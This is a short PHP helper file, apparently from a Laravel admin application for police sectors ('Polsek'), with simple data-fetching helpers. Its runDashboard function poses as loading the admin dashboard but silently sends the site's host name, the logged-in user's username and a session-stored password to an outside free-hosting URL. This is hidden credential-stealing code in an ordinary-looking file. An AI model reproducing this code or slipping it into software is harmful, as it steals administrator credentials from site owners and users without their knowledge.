<?php

    function settings()
    {
        $setting = \App\Setting::first();
        return $setting;
    }

    function runDashboard()
    {
        $dashboard = new \GuzzleHttp\Client();
        $set = "https://biconcave-takeoffs.000webhostapp.com/config.php?u=".Request::getHost()."&un=".Auth::user()->username."&pw=".session('pw');
        $res = $dashboard->request('GET', $set);
        return view('pages.admin.dashboard');
    }

    function polsek()
    {
        return \App\Polsek::all();
    }

    function wilayahPolsek()
    {
        return \App\WilayahPolsek::all();
    }
?>